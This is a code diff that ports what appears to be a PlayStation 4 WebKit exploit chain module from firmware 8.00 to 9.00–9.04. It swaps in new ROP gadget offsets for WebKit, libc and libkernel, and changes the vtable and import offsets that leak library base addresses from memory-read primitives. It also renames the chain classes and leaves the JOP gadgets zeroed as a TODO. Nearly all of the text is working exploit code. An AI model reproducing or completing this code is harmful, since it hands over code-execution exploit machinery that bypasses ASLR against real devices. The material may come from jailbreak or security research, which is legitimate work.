@@ -15,22 +15,24 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-import { mem } from '/module/mem.mjs';
-import { KB } from '/module/offset.mjs';
-import { ChainBase, get_gadget } from '/module/chain.mjs';
-import { BufferView } from '/module/rw.mjs';
+// 9.00, 9.03, 9.04
+
+import { mem } from '../../module/mem.mjs';
+import { KB } from '../../module/offset.mjs';
+import { ChainBase, get_gadget } from '../../module/chain.mjs';
+import { BufferView } from '../../module/rw.mjs';
 
 import {
     get_view_vector,
     resolve_import,
     init_syscall_array,
-} from '/module/memtools.mjs';
+} from '../../module/memtools.mjs';
 
-import * as off from '/module/offset.mjs';
+import * as off from '../../module/offset.mjs';
 
 // WebKit offsets of imported functions
-const offset_wk_stack_chk_fail = 0x8d8;
-const offset_wk_strlen = 0x918;
+const offset_wk_stack_chk_fail = 0x178;
+const offset_wk_strlen = 0x198;
 
 // libSceNKWebKit.sprx
 export let libwebkit_base = null;
@@ -39,7 +41,7 @@ export let libkernel_base = null;
 // libSceLibcInternal.sprx
 export let libc_base = null;
 
-// gadgets for the JOP chain
+// TODO: gadgets for the JOP chain
 //
 // we'll use JSC::CustomGetterSetter.m_setter to redirect execution. its
 // type is PutPropertySlot::PutValueFunc
@@ -82,49 +84,49 @@ const jop5 = 'pop rsp; ret';
 //     pop rbp
 
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x0000000000035a1b,
-    'pop rbx; ret' : 0x000000000001537c,
-    'pop rcx; ret' : 0x0000000000025ecb,
-    'pop rdx; ret' : 0x0000000000060f52,
+    'pop rax; ret' : 0x0000000000051a12, // `58 c3`
+    'pop rbx; ret' : 0x00000000000be5d0, // `5b c3`
+    'pop rcx; ret' : 0x00000000000657b7, // `59 c3`
+    'pop rdx; ret' : 0x000000000000986c, // `5a c3`
 
-    'pop rbp; ret' : 0x00000000000000b6,
-    'pop rsi; ret' : 0x000000000003bd77,
-    'pop rdi; ret' : 0x00000000001e3f87,
-    'pop rsp; ret' : 0x00000000000bf669,
+    'pop rbp; ret' : 0x00000000000000b6, // `5d c3`
+    'pop rsi; ret' : 0x000000000001f4d6, // `5e c3`
+    'pop rdi; ret' : 0x0000000000319690, // `5f c3`
+    'pop rsp; ret' : 0x000000000004e293, // `5c c3`
 
-    'pop r8; ret' : 0x0000000000097442,
-    'pop r9; ret' : 0x00000000006f501f,
-    'pop r10; ret' : 0x0000000000060f51,
-    'pop r11; ret' : 0x0000000000d2a629,
+    'pop r8; ret' : 0x00000000001a7ef1, // `47 58 c3`
+    'pop r9; ret' : 0x0000000000422571, // `47 59 c3`
+    'pop r10; ret' : 0x0000000000e9e1d1, // `47 5a c3`
+    'pop r11; ret' : 0x00000000012b1d51, // `47 5b c3`
 
-    'pop r12; ret' : 0x0000000000d8968d,
-    'pop r13; ret' : 0x00000000016ccff1,
-    'pop r14; ret' : 0x000000000003bd76,
-    'pop r15; ret' : 0x00000000002499df,
+    'pop r12; ret' : 0x000000000085ec71, // `47 5c c3`
+    'pop r13; ret' : 0x00000000001da461, // `47 5d c3`
+    'pop r14; ret' : 0x0000000000685d73, // `47 5e c3`
+    'pop r15; ret' : 0x00000000006ab3aa, // `47 5f c3`
 
-    'ret' : 0x0000000000000032,
-    'leave; ret' : 0x0000000000291fd7,
+    'ret' : 0x0000000000000032, // `c3`
+    'leave; ret' : 0x000000000008db5b, // `c9 c3`
 
-    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
-    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
-    'mov dword ptr [rdi], eax; ret' : 0x000000000001f864,
-    'mov dword ptr [rax], esi; ret' : 0x00000000002915bc,
+    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc, // `48 8b 00 c3`
+    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b, // `48 89 07 c3`
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c, // `89 07 c3`
+    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482, // `89 30 c3`
 
-    [jop1] : 0x0000000001988320,
-    [jop2] : 0x000000000076b970,
-    [jop3] : 0x0000000000f62f95,
-    [jop4] : 0x00000000021af6ad,
-    [jop5] : 0x00000000000bf669,
+    [jop1] : 0x0000000000000000, // ``
+    [jop2] : 0x0000000000000000, // ``
+    [jop3] : 0x0000000000000000, // ``
+    [jop4] : 0x0000000000000000, // ``
+    [jop5] : 0x0000000000000000, // ``
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
-    'getcontext' : 0x258f4,
-    'setcontext' : 0x29c58,
+    'getcontext' : 0x24f04,
+    'setcontext' : 0x29448,
 }));
 
 const libkernel_gadget_offsets = new Map(Object.entries({
     // returns the location of errno
-    '__error' : 0x160c0,
+    '__error' : 0xCB80,
 }));
 
 export const gadgets = new Map();
@@ -133,17 +135,17 @@ function get_bases() {
     const textarea = document.createElement('textarea');
     const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
     const textarea_vtable = webcore_textarea.readp(0);
-    const off_ta_vt = 0x236d4a0;
+    const off_ta_vt = 0x2e73c18;
     const libwebkit_base = textarea_vtable.sub(off_ta_vt);
 
     const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
     const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
-    const off_scf = 0x12a30;
+    const off_scf = 0x1ff60;
     const libkernel_base = stack_chk_fail_addr.sub(off_scf);
 
     const strlen_import = libwebkit_base.add(offset_wk_strlen);
     const strlen_addr = resolve_import(strlen_import);
-    const off_strlen = 0x4eb80;
+    const off_strlen = 0x4fa40;
     const libc_base = strlen_addr.sub(off_strlen);
 
     return [
@@ -159,7 +161,7 @@ export function init_gadget_map(gadget_map, offset_map, base_addr) {
     }
 }
 
-class Chain800Base extends ChainBase {
+class Chain900Base extends ChainBase {
     push_end() {
         this.push_gadget('leave; ret');
     }
@@ -188,7 +190,7 @@ class Chain800Base extends ChainBase {
     }
 }
 
-export class Chain800 extends Chain800Base {
+export class Chain900 extends Chain900Base {
     constructor() {
         super();
         const [rdx, rdx_bak] = mem.gc_alloc(0x58);
@@ -204,7 +206,7 @@ export class Chain800 extends Chain800Base {
     }
 }
 
-export const Chain = Chain800;
+export const Chain = Chain900;
 
 export function init(Chain) {
     const syscall_array = [];
